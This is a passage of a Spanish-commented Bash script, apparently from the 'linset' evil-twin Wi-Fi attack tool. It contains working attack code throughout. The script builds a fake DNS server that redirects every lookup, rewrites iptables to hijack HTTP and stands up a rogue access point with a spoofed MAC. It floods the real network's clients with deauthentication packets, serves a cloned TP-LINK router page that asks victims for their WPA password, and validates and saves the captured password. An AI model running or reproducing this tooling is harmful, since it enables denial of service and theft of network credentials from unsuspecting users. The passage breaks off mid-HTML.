# Script (no es mio) que redirige todas las peticiones del DNS a la puerta de enlace (nuestro PC)
echo "import socket

class DNSQuery:
  def __init__(self, data):
    self.data=data
    self.dominio=''

    tipo = (ord(data[2]) >> 3) & 15   # 4bits de tipo de consulta
    if tipo == 0:                     # Standard query
      ini=12
      lon=ord(data[ini])
      while lon != 0:
        self.dominio+=data[ini+1:ini+lon+1]+'.'
        ini+=lon+1
        lon=ord(data[ini])

  def respuesta(self, ip):
    packet=''
    if self.dominio:
      packet+=self.data[:2] + \"\x81\x80\"
      packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'   # Numero preg y respuestas
      packet+=self.data[12:]                                         # Nombre de dominio original
      packet+='\xc0\x0c'                                             # Puntero al nombre de dominio
      packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'             # Tipo respuesta, ttl, etc
      packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.'))) # La ip en hex
    return packet

if __name__ == '__main__':
  ip='$IP'
  print 'pyminifakeDNS:: dom.query. 60 IN A %s' % ip

  udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  udps.bind(('',53))

  try:
    while 1:
      data, addr = udps.recvfrom(1024)
      p=DNSQuery(data)
      udps.sendto(p.respuesta(ip), addr)
      print 'Respuesta: %s -> %s' % (p.dominio, ip)
  except KeyboardInterrupt:
    print 'Finalizando'
    udps.close()
" >$DUMP_PATH/fakedns
chmod +x $DUMP_PATH/fakedns

}

# Prepara las tablas de enrutamiento para establecer un servidor DHCP/WEB
function routear {

ifconfig $interfaceroutear up
ifconfig $interfaceroutear $IP netmask 255.255.255.0

route add -net $RANG_IP.0 netmask 255.255.255.0 gw $IP
echo "1" > /proc/sys/net/ipv4/ip_forward

iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables -P FORWARD ACCEPT

iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $IP:80
iptables -t nat -A POSTROUTING -j MASQUERADE
}

# Ejecuta el ataque
function atack {
if [ "$fakeapmode" = "hostapd" ]; then
  interfaceroutear=$WIFI
elif [ "$fakeapmode" = "airbase-ng" ]; then
  interfaceroutear=at0
fi

handshakecheck &
nomac=$(tr -dc A-F0-9 < /dev/urandom | fold -w2 |head -n100 | grep -v "${mac:13:1}" | head -c 1)

if [ "$fakeapmode" = "hostapd" ]; then

ifconfig $WIFI down
sleep 0.4
macchanger --mac=${mac::13}$nomac${mac:14:4} $WIFI &> $linset_output_device
sleep 0.4
ifconfig $WIFI up
sleep 0.4
fi


if [ $fakeapmode = "hostapd" ]; then
  killall hostapd &> $linset_output_device
  xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "Access Point" -e hostapd $DUMP_PATH/hostapd.conf &
elif [ $fakeapmode = "airbase-ng" ]; then
  killall airbase-ng &> $linset_output_device
  xterm $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "Access Point" -e airbase-ng -P -e $Host_SSID -c $Host_CHAN -a ${mac::13}$nomac${mac:14:4} $WIFI_MONITOR &
fi
sleep 5

routear &
sleep 3


killall dhcpd &> $linset_output_device
xterm -bg black -fg yellow $TOPLEFT -T Servidor-DHCP -e "dhcpd -d -f -cf "$DUMP_PATH/dhcpd.conf" $interfaceroutear 2>&1 | tee -a $DUMP_PATH/clientes.txt" &

killall $(netstat -lnptu | grep ":53" | grep "LISTEN" | awk '{print $7}' | cut -d "/" -f 2) &> $linset_output_device
xterm $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "Fake Dns" -e python $DUMP_PATH/fakedns &

killall $(netstat -lnptu | grep ":80" | grep "LISTEN" | awk '{print $7}' | cut -d "/" -f 2) &> $linset_output_device
lighttpd -f $DUMP_PATH/lighttpd.conf &> $linset_output_device

killall aireplay-ng &> $linset_output_device
xterm $HOLD $BOTTOMRIGHT -bg "#FFFFFF" -fg blue -title "Desautenticando a $Host_SSID" -e aireplay-ng -0 0 -a $Host_MAC --ignore-negative-one $WIFI_MONITOR &


xterm -hold $TOPRIGHT -title "Esperando la pass" -e $DUMP_PATH/handcheck &
conditional_clear

while true; do
mostrarheader

  echo "Ataque en curso..."
  echo "                                       "
  echo "      1) Elegir otra red" 
  echo "      2) Salir"
  echo " "
  echo -n '      #> '
  read yn
  case $yn in
    1 ) matartodo; CSVDB=dump-01.csv; selection; break;;
    2 ) matartodo; exitmode; break;;
    * ) echo "Opción desconocida. Elige de nuevo"; conditional_clear ;;
  esac
done


}

# Comprueba la validez de la contraseña
function handshakecheck {

echo "#!/bin/bash

echo > $DUMP_PATH/data.txt
echo -n \"0\"> $DUMP_PATH/hit.txt

clear

minutos=0
horas=0
i=0">$DUMP_PATH/handcheck

if [ $authmode = "handshake" ]; then
  echo "until ! aircrack-ng -w $DUMP_PATH/data.txt $DUMP_PATH/$Host_MAC-01.cap | grep -qi \"Passphrase not in\"; do">>$DUMP_PATH/handcheck

elif [ $authmode = "wpa_supplicant" ]; then
  echo "echo "" >$DUMP_PATH/loggg

until ( grep -i 'WPA: Key negotiation completed' $DUMP_PATH/loggg ); do

wpa_passphrase $Host_SSID \$(cat $DUMP_PATH/data.txt)>$DUMP_PATH/wpa_supplicant.conf &
wpa_supplicant -i$WIFI -c$DUMP_PATH/wpa_supplicant.conf -f $DUMP_PATH/loggg &">>$DUMP_PATH/handcheck

fi

echo "segundos=\$i
dias=\`expr \$segundos / 86400\`
segundos=\`expr \$segundos % 86400\`
horas=\`expr \$segundos / 3600\`
segundos=\`expr \$segundos % 3600\`
minutos=\`expr \$segundos / 60\`
segundos=\`expr \$segundos % 60\`

if [ \"\$segundos\" -le 9 ]; then
is=\"0\"
else
is=
fi

if [ \"\$minutos\" -le 9 ]; then
im=\"0\"
else
im=
fi

if [ \"\$horas\" -le 9 ]; then
ih=\"0\"
else
ih=
fi


readarray -t CLIENTESDHCP < <(cat $DUMP_PATH/clientes.txt | grep DHCPACK | awk '!x[\$0]++')

echo
echo -e \"  PUNTO DE ACCESO:\"
echo -e \"    Nombre..........: "$blanco"$Host_SSID"$rescolor"\"
echo -e \"    MAC.............: "$amarillo"$Host_MAC"$rescolor"\"
echo -e \"    Canal...........: "$blanco"$Host_CHAN"$rescolor"\"
echo -e \"    Fabricante......: "$verde"$Host_MAC_MODEL"$rescolor"\"
echo -e \"    Tiempo activo...: "$gris"\$ih\$horas:\$im\$minutos:\$is\$segundos"$rescolor"\"
echo -e \"    Intentos........: "$rojo"\$(cat $DUMP_PATH/hit.txt)"$rescolor"\"
echo -e \"    Clientes........: "$azul"$(cat $DUMP_PATH/clientes.txt | grep DHCPACK | awk '!x[$0]++' | wc -l)"$rescolor"\"
echo
echo -e \"  CLIENTES:\"

x=0
for line in \"\${CLIENTESDHCP[@]}\"; do
  x=\$((\$x+1))
  echo -e \"    "$verde"\$x) "$rojo"\$(echo \$line| cut -d \" \" -f 3) "$amarillo"\$(echo \$line| cut -d \" \" -f 5) "$verde"\$(echo \$line| cut -d \" \" -f 6)"$rescolor"\"   
done

echo -ne \"\033[K\033[u\"">>$DUMP_PATH/handcheck




if [ $authmode = "handshake" ]; then
  echo "let i=\$i+1
  sleep 1">>$DUMP_PATH/handcheck

elif [ $authmode = "wpa_supplicant" ]; then
  echo "sleep 5

killall wpa_supplicant &>$linset_output_device
killall wpa_passphrase &>$linset_output_device
let i=\$i+5">>$DUMP_PATH/handcheck
fi

echo "done
clear
echo \"1\" > $DUMP_PATH/status.txt

sleep 4

killall aireplay-ng &>/dev/null
killall airbase-ng &>/dev/null
killall python &>/dev/null
killall hostapd &>/dev/null
killall lighttpd &>/dev/null
killall dhcpd &>/dev/null
killall linset
airmon-ng stop $WIFI_MONITOR &> /dev/null
airmon-ng stop $WIFI &> /dev/null

echo \"
SSID: $Host_SSID
BSSID: $Host_MAC ($Host_MAC_MODEL)
Channel: $Host_CHAN
Security: $Host_ENC
Time: \$ih\$horas:\$im\$minutos:\$is\$segundos
Password: \$(cat $DUMP_PATH/data.txt)
\" >$HOME/$Host_SSID-password.txt">>$DUMP_PATH/handcheck


if [ $authmode = "handshake" ]; then
  echo "aircrack-ng -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $DUMP_PATH/data.txt && echo && echo -e \"Se ha guardado en "$rojo"$HOME/$Host_SSID-password.txt"$rescolor"\" 
">>$DUMP_PATH/handcheck

elif [ $authmode = "wpa_supplicant" ]; then
  echo "echo -e \"Se ha guardado en "$rojo"$HOME/$Host_SSID-password.txt"$rescolor"\"">>$DUMP_PATH/handcheck
fi

chmod +x $DUMP_PATH/handcheck
}


############################################# < ATAQUE > ############################################






############################################## < COSAS > ############################################

# Funcion que limpia las interfaces y sale
function exitmode {
airmon-ng stop $WIFI_MONITOR &> $linset_output_device
airmon-ng stop $WIFI &> $linset_output_device
conditional_clear
exit

}

# Deauth a todos
function deauthall {
xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FFD700" -title "Realizando Dos a los clientes de $Host_SSID" -e aireplay-ng --deauth $DEAUTHTIME -a $Host_MAC --ignore-negative-one $WIFI_MONITOR &
}

# Deauth a un cliente específico
function deauthesp {
sleep 2
xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#0000FF" -title "Desautenticando a $Client_MAC" -e aireplay-ng -0 $DEAUTHTIME -a $Host_MAC -c $Client_MAC --ignore-negative-one $WIFI_MONITOR &
}

# Cierra todos los procesos
function matartodo {

killall aireplay-ng &>$linset_output_device
killall python &>$linset_output_device
killall hostapd &>$linset_output_device
killall lighttpd &>$linset_output_device
killall dhcpd &>$linset_output_device
killall xterm &>$linset_output_device

}

############################################## < COSAS > ############################################






######################################### < INTERFACES WEB > ########################################

# Crea el contenido de la iface T⁻LINK_WRXXXX
function TP-LINK {
mkdir $DUMP_PATH/data &>$linset_output_device

function index {
echo "<html><head>
<title>TP-LINK</title>

<frameset rows=\"90,*\">
<frame name=\"topFrame\" marginwidth=\"0\" marginheight=\"0\" src=\"data/top.htm\" noresize=\"noresize\" framespacing=\"0\" frameborder=\"0\" scrolling=\"no\">
<frameset cols=\"182,55%,*\">
<frame name=\"bottomLeftFrame\" src=\"data/MenuRpm.htm\" noresize=\"noresize\" frameborder=\"1\" style=\"overflow-x:hidden\" scrolling=\"auto\">
<frame name=\"mainFrame\" src=\"data/StatusRpm.htm\">
<frame name=\"helpFrame\" src=\"data/StatusHelpRpm.htm\">
</frameset>

<noframes>
<body id=\"t_noFrame\">Please upgrade to a version 4 or higher browser so that you can use this setup tool.</body>
</noframes>

</frameset>

</html>" > $DUMP_PATH/index.htm
}

function css_help {
echo "BODY {
	MARGIN: 42 15 15 15;
	padding: 0px;
	text-align: justify;
	background-image:url(/images/helpPic.gif);
	background-repeat:no-repeat;
	background-position:right bottom;
	FONT-FAMILY: Arial, Helvetica, Geneva, Swiss, SunSans-Regular, sans-serif;
	background-attachment: fixed;
	COLOR: #000000;
	background-color: rgb(240,247,241);
}
DIV	{width: 100%;}
P	{LIST-STYLE-POSITION: outside; FONT-SIZE: 12px; }
H1	{FONT-WEIGHT: bold; FONT-SIZE: 16px; }
H2	{FONT-WEIGHT: bold; FONT-SIZE: 14px; }
UL	{LIST-STYLE-POSITION: outside; FONT-SIZE: 12px; }
OL	{LIST-STYLE-POSITION: outside; FONT-SIZE: 12px;}
TH	{FONT-SIZE: 12px;}
TD	{FONT-SIZE: 12px;}

" > $DUMP_PATH/data/css_help.css
}

function error {
echo "<link rel=\"stylesheet\" type=\"text/css\" href=\"info.css\" />
</HEAD>

<BODY>

<CENTER>


    <TABLE id=\"autoWidth\">

      <TBODY>

        <TR>

          <TD class=h1 colspan=2 id=\"t_title\">Password Error</TD>

        </TR>

        <TR>

          <TD class=blue colspan=2></TD>

        </TR>



        <TR>

          <TD class=info1 colspan=2>
          
<b><font color=\"red\" size=\"4\">Error</font>:</b> The entered password is <b>NOT</b> correct!</b></TD></TR>


        <TR><TD class=blue colspan=2></TD></TR>
        
<tr><td colspan=\"2\" align=\"center\"><form><INPUT name=\"Back\" onclick=\"history.back();return false\" class=\"buttonBig\" type=\"submit\" value=\"Back\"/></form></td></tr>




      </TBODY>

    </TABLE>


</CENTER>

</BODY>

</HTML>" > $DUMP_PATH/data/error.html
}

function final {
echo "<link rel=\"stylesheet\" type=\"text/css\" href=\"info.css\" />
</HEAD>

<BODY>

<CENTER>


    <TABLE id=\"autoWidth\">

      <TBODY>

        <TR>

          <TD class=h1 colspan=2 id=\"t_title\">Lock Center</TD>

        </TR>

        <TR>

          <TD class=blue colspan=2></TD>

        </TR>



        <TR>

          <TD class=info1 colspan=2>
          
Your connection will be restored in a few moments.</TD></TR>


        <TR><TD class=blue colspan=2></TD></TR>
        



      </TBODY>

    </TABLE>


</CENTER>

</BODY>

</HTML>" > $DUMP_PATH/data/final.html
}

function info {
echo "TABLE{	Width:100%;	margin: 0px;	padding: 0px;} 

TABLE.guage{	background-color:rgb(102,186,51);} 

BODY {	FONT-SIZE: 12px;	MARGIN: 42 30 30 30;	FONT-FAMILY: \"Arial\", \"Helvetica\", \"Geneva\", \"Swiss\", \"SunSans-Regular\", \"sans-serif\";	color: black;	background-color:rgb(250,250,250);}

TEXTAREA.same{	overflow:auto; border:1px; border-style:dashed; font-family :Arial,Helvetica; FONT-SIZE: 12px; background-color: rgb(250,250,250); }

TD   { FONT-SIZE: 12px; height: 24px;  white-space:nowrap; vertical-align: middle;}   

TD.h1 {	FONT-SIZE: 16px; COLOR: WHITE; background-color:rgb(102,186,51); FONT-WEIGHT: bold; padding-left: 15; } 

TD.h2 {	FONT-SIZE: 16px; height: 30px; FONT-WEIGHT: bold; padding-left: 15; white-space:normal;}

TD.h3 {	FONT-SIZE: 14px; height: 30px; white-space:normal;}  

TD.info { padding-left: 25; }   

TD.info1 { padding-left: 35; }  

TD.clk { padding-left: 25; Width:5%}  

TD.mbtn {padding-left: 30%}  

TD.blue {	background-image:url(data:image/jpeg;base64,/9j/4AAQSkZJRgABAgAAZABkAAD/7AARRHVja3kAAQAEAAAAUAAA/+4AJkFkb2JlAGTAAAAAAQMAFQQDBgoNAAABuAAAAegAAAIkAAACVP/bAIQAAgICAgICAgICAgMCAgIDBAMCAgMEBQQEBAQEBQYFBQUFBQUGBgcHCAcHBgkJCgoJCQwMDAwMDAwMDAwMDAwMDAEDAwMFBAUJBgYJDQsJCw0PDg4ODg8PDAwMDAwPDwwMDAwMDA8MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwM/8IAEQgAKQAQAwERAAIRAQMRAf/EAIsAAQEBAAAAAAAAAAAAAAAAAAAGCAEBAQEAAAAAAAAAAAAAAAAAAAIEEAABBQEAAAAAAAAAAAAAAAAgAAEREwQVEQAABwAAAAAAAAAAAAAAAAAAINIENJQFEgACAwAAAAAAAAAAAAAAAAAgQQAwkRMAAQMFAQAAAAAAAAAAAAAAIAABkTDwEVFhwf/aAAwDAQACEQMRAAAB3oAACHnMLitIA//aAAgBAQABBQIuDmXBzD//2gAIAQIAAQUCKFA//9oACAEDAAEFAiqZVMP/2gAIAQICBj8Cs//aAAgBAwIGPwInsej/AP/aAAgBAQEGPwI03SvOFibpXnCy/wD/2gAIAQEDAT8hqX7/AP/aAAgBAgMBPyGof//aAAgBAwMBPyEuki6SD//aAAwDAQACEQMRAAAQAAAkAA//2gAIAQEDAT8QqEiX/9oACAECAwE/ECx28usdvLj/AP/aAAgBAwMBPxArJ9Vk+j//2Q==); background-position:0% 10%; height: 30px;} 

TD.Item {	FONT-WEIGHT: bold;	text-align: right;	padding-right: 30;	width: 30%;}  

TD.emp {FONT-WEIGHT: bold; color: #003399; font-size: 13px;}

TD.ListTC1 {text-align: right;	padding-right: 20; FONT-WEIGHT: bold; font-size: 13px;} 

TD.ListTC2 {text-align: left;	FONT-WEIGHT: bold; padding-left: 20; font-size: 13px;} 

TD.ListC1 {text-align: right;	padding-right: 20; } 

TD.ListC2 {text-align: left; FONT-WEIGHT:bold; padding-left: 20; } 

TD.ListB {text-align: left; FONT-WEIGHT:bold;white-space:nowrap;} 

TD.Listm {text-align: center;} 

TD.Listr {text-align: right; padding-right: 5;} 

input  {vertical-align: middle;} 

input.text {	height: 22px;	color: black;	padding-right: 3px;	padding-left: 3px;}

input.radio{vertical-align: middle;} 

input.button {	line-height: normal;	color: black;	height: 22px;	width: 75px;}

input.buttonL {	line-height: normal;	color: black;	height: 22px; width: 160px;}

input.buttonLL {	line-height: normal;	color: black;	height: 22px;}

input.buttonBig {	FONT-SIZE: 14px;	line-height: normal;	color: black;	height: 22px;	width: 100px;}

input.buttonBigL{	FONT-SIZE: 14px;	line-height: normal;	color: black;	height: 22px;}

select  {vertical-align: middle; height: 22px;	color: black;} 

select.list { width: 120px;}

select.listL { width: 150px;}

select.listS { width: 80px;}

select.listLL{width:230px;}

select.listLLL{width:300px;}



TD[type=\"h1\"]:disabled,

TD[type=\"emp\"]:disabled,

input[type=\"submit\"]:disabled,

input[type=\"text\"]:disabled, 

input[type=\"button\"]:disabled, 

input[type=\"buttonL\"]:disabled, 

input[type=\"buttonLL\"]:disabled, 

input[type=\"buttonBig\"]:disabled, 

input[type=\"buttonBigL\"]:disabled {

	color:gray;

}



span.tips{color:#FF0000; padding:0px 5px}

span.countDown{color:#929292; font-size:22px; font-weight:bold}
 
" > $DUMP_PATH/data/info.css
}

function MenuRpm {
echo "<html><head>
<script language=\"JavaScript\">
var visibleMenuList = new Array(
\"StatusRpm\",
\"WzdStartRpm\",
\"WpsCfgRpm\",
\"NetworkCfgRpm\",
\"WanCfgRpm\",
\"MacCloneCfgRpm\",
\"WlanNetworkRpm\",
\"WlanSecurityRpm\",
\"WlanMacFilterRpm\",
\"WlanAdvRpm\",
\"WlanStationRpm\",
\"LanDhcpServerRpm\",
\"AssignedIpAddrListRpm\",
\"FixMapCfgRpm\",
\"VirtualServerRpm\",
\"SpecialAppRpm\",
\"DMZRpm\",
\"UpnpCfgRpm\",
\"BasicSecurityRpm\",
\"AdvScrRpm\",
\"LocalManageControlRpm\",
\"ManageControlRpm\",
\"ParentCtrlRpm\",
\"AccessCtrlAccessRulesRpm\",
\"AccessCtrlHostsListsRpm\",
\"AccessCtrlAccessTargetsRpm\",
\"AccessCtrlTimeSchedRpm\",
\"StaticRouteTableRpm\",
\"QoSCfgRpm\",
\"QoSRuleListRpm\",
\"LanArpBindingRpm\",
\"LanArpBindingListRpm\",
\"DdnsAddRpm\",
\"DateTimeCfgRpm\",
\"DiagnosticRpm\",
\"SoftwareUpgradeRpm\",
\"RestoreDefaultCfgRpm\",
\"BakNRestoreRpm\",
\"SysRebootRpm\",
\"ChangeLoginPwdRpm\",
\"SystemLogRpm\",
\"SystemStatisticRpm\",
0,0 );
</script>

<meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1252\">
<style type=\"text/css\">
<!--
BODY 
{
	margin-top: 20px;
	margin-left: 0px;
	FONT-FAMILY: Arial, Helvetica, Geneva, Swiss, SunSans-Regular;
	WHITE-SPACE: nowrap;
	BACKGROUND-COLOR: rgb(150,150,150)
}
menu 
{
	margin-left:0px;
	PADDING-LEFT: 0px;
	FONT-SIZE: 12px;
	TEXT-DECORATION: none;
	color: #2a166b;
}
ol 
{
	margin:2 0 0 0;
	PADDING-LEFT: 13px;
	FONT-WEIGHT: bold;
	FONT-SIZE: 12px;
	TEXT-DECORATION: none;
	height: 22px;
	line-height: 22px;
	width:180;
	list-style: inside none;
	BACKGROUND-COLOR: rgb(66,66,66)
}
ol.info 
{
	margin:0 0 0 0;
	COLOR: white;
	width:180;
	PADDING-LEFT: 2px;
}
a {
	noneFocusLine: expression(this.onFocus=this.blur());
}
a:focus {
	-moz-outline-style:none;
}
a.L1 {
	COLOR: #C0C0C0;
	PADDING-LEFT: 23px;
}
a.L3 {
	COLOR: rgb(171,221,47);
	PADDING-LEFT: 23px;
}
a.L2 {
	COLOR: white;
	PADDING-LEFT: 23px;
}
A:visited {
	TEXT-DECORATION: none;
	underline: none
}
A:link {
	TEXT-DECORATION: none;
	underline: none
}
ol.dot1 {
	background-repeat:no-repeat;
}
ol.plus {
	background-repeat:no-repeat;
}
ol.minus {
	background-repeat:no-repeat;
	background-color: rgb(102,186,51)
}
ol.dot2 {
	background-repeat:no-repeat;
	background-color: rgb(96,96,96)
}
ol.otherInfo {
	PADDING-LEFT: 1px;
	PADDING-RIGHT: 0px;
}
.hidden {
	display: none;
}
.show {
	display: block;
}
-->
</style>
</head>

<body leftmargin=\"0\" topmargin=\"0\" bgcolor=\"#330099\" marginheight=\"0\" marginwidth=\"0\">
<menu cellspacing=\"2\" cellpadding=\"1\" border=\"0\" width=\"180\">
<script type=\"text/javascript\"><!--
menuInit(visibleMenuList);
menuDisplay();
//--></script><ol id=\"ol0\" class=\"dot1\" style=\"display:block; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a0\" target=\"mainFrame\" class=\"L3\" onclick=\"doClick(0);\">Lock Center</a></ol><ol id=\"ol1\" class=\"dot1\" style=\"display:block; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a1\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(1);\">Quick Setup</a></ol><ol id=\"ol3\" class=\"plus\" style=\"display:block; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a3\" href=\"StatusRpm.htm\" target=\"mainFrame\" 
class=\"L1\" onclick=\"doClick(3);\">Network</a></ol><ol id=\"ol4\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a4\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(4);\">- LAN</a></ol><ol id=\"ol5\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a5\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(5);\">- WAN</a></ol><ol id=\"ol6\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a6\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(6);\">- MAC Clone</a></ol><ol id=\"ol7\" class=\"plus\" style=\"display:block; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a7\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(7);\">Wireless</a></ol><ol id=\"ol8\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a8\" href=\"StatusRpm.htm\" target=\"
mainFrame\" class=\"L1\" onclick=\"doClick(8);\">- Wireless Settings</a></ol><ol id=\"
ol9\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a9\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(9);\">- Wireless Security</a></ol><ol id=\"ol10\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a10\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(10);\">- Wireless MAC Filtering</a></ol><ol id=\"ol11\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"
><a id=\"a11\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(11);\">- Wireless Advanced</a></ol><ol id=\"ol12\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a12\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(12);\">- Wireless Statistics</a></ol><ol id=\"ol13\" class=\"plus\" style=\"display:block; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a13\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(13);\">DHCP</a></ol><ol id=\"ol14\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a14\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(14);\">- DHCP Settings</a></ol><ol 
id=\"ol15\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a15\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(15);\">- DHCP Clients List</a></ol><ol id=\"ol16\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a16\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(16);\">- Address Reservation</a></ol><ol id=\"ol17\" class=\"plus\" style=\"display:block; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a17\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(17);\">Forwarding</a></ol><ol id=\"ol18\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a18\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(18);\">- Virtual Servers</a></ol><ol id=\"ol19\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a19\" href=\"StatusRpm.htm\" target=\"
mainFrame\" class=\"L1\" onclick=\"doClick(19);\">- Port Triggering</a></ol><ol id=\"ol20\"
 class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a20\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(20);\">- DMZ</a></ol><ol id=\"ol21\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a21\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(21);\">- UPnP</a></ol><ol id=\"ol22\" class=\"plus\" style=\"display:block; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a22\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(22);\">Security</a></ol><ol id=\"ol23\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a23\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(23);\">- Basic Security</a></ol><ol id=\"ol24\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a24\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(24);\">- 
Advanced Security</a></ol><ol id=\"ol25\" class=\"dot2\" style=\"display:none; 
background-position:2px;PADDING-LEFT:2px;\"><a id=\"a25\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(25);\">- Local Management</a></ol><ol id=\"ol26\" class=\"dot2\" 
style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a26\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(26);\">- Remote Management</a></ol><ol id=\"ol27\" class=\"dot1\" style=\"display:block; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a27\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(27);\">Parental Control</a></ol><ol id=\"ol28\" class=\"plus\" style=\"display:block; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a28\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(28);\">Access Control</a></ol><ol id=\"ol29\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a29\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(29);\">- Rule</a></ol><ol id=\"ol30\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a30\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(30);
\">- Host</a></ol><ol id=\"ol31\" class=\"dot2\" style=\"display:none; 
background-position:2px;PADDING-LEFT:2px;\"><a id=\"a31\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(31);\">- Target</a></ol><ol id=\"ol32\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a32\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(32);\">- Schedule</a></ol><ol id=\"ol33\" class=\"plus\" style=\"display:block; background-position:2px;PADDING-LEFT:
2px;\"><a id=\"a33\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(33);\">Static Routing</a></ol><ol id=\"ol34\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a34\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(34);\">- Static Routing List</a></ol><ol id=\"ol35\" class=\"plus\" style=\"display:block; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a35\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(35);\">Bandwidth Control</a></ol><ol id=\"ol36\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a36\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(36);\">- Control 
